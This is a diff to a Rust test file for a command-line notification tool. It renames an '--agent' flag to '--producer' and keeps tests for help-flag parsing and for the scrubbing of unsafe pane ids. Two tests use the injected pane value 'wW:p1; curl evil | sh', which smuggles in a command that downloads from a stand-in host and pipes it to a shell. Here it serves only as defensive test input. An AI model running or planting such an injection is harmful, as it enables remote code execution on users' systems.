@@ -7,7 +7,13 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
         .pns()
         .env("PNS_IDLE_SECS", "0")
         .args([
-            "send", "--agent", "claude", "--state", "done", "--detail", "x",
+            "send",
+            "--producer",
+            "claude",
+            "--state",
+            "done",
+            "--detail",
+            "x",
         ])
         .args(["--pane", "wW:p1; curl evil | sh"]));
     assert!(sandbox.fired("macos-banner"));
@@ -23,7 +29,7 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
         .pns()
-        .args(["send", "--agent", "claude", "--state", "done"])
+        .args(["send", "--producer", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--local-only", "--remote-only"]));
     assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
@@ -118,7 +124,7 @@ fn a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event() {
         "--help=x",
         "--HELP",
         "-help",
-        "--agent=claude",
+        "--producer=claude",
     ] {
         let sandbox = Sandbox::new("dash-led-typo");
         let output = sandbox.pns().arg(word).output().expect("the engine runs");
@@ -150,13 +156,13 @@ fn a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it() {
 
 #[test]
 fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
-    // R5-2 + H-A: help was checked at argv[1] only, so `--agent claude
+    // R5-2 + H-A: help was checked at argv[1] only, so `--producer claude
     // --help` delivered the event with `--help` unconsumed, and `--
     // --help`/`stray --help` reached the lenient producer parser and did the
     // same. Every shape reaches the parser's own help arm instead, and the
     // subcommand in front of them is what says this is a send at all.
     for argv in [
-        &["--agent", "claude", "--help"][..],
+        &["--producer", "claude", "--help"][..],
         &["--local-only", "--help"][..],
         &["--", "--help"][..],
         &["stray", "--help"][..],
@@ -186,18 +192,18 @@ fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
 fn help_in_value_position_is_still_just_a_value() {
     // H-F, PINNED so nobody "fixes" this by adding `--help` to
     // `is_producer_flag`: doing that would flip the value rule and make
-    // `--agent --help` warn-and-drop instead of delivering an agent whose
+    // `--producer --help` warn-and-drop instead of delivering an agent whose
     // name literally is "--help". States are free-form the same way.
     let sandbox = Sandbox::new("help-as-agent-value");
     run(sandbox
         .pns()
-        .args(["send", "--agent", "--help", "--state", "done"]));
+        .args(["send", "--producer", "--help", "--state", "done"]));
     assert_eq!(sandbox.event("mobile")["agent"], "--help");
 
     let sandbox = Sandbox::new("help-as-state-value");
     run(sandbox
         .pns()
-        .args(["send", "--agent", "claude", "--state", "--help"]));
+        .args(["send", "--producer", "claude", "--state", "--help"]));
     assert_eq!(sandbox.event("mobile")["state"], "--help");
 }
 
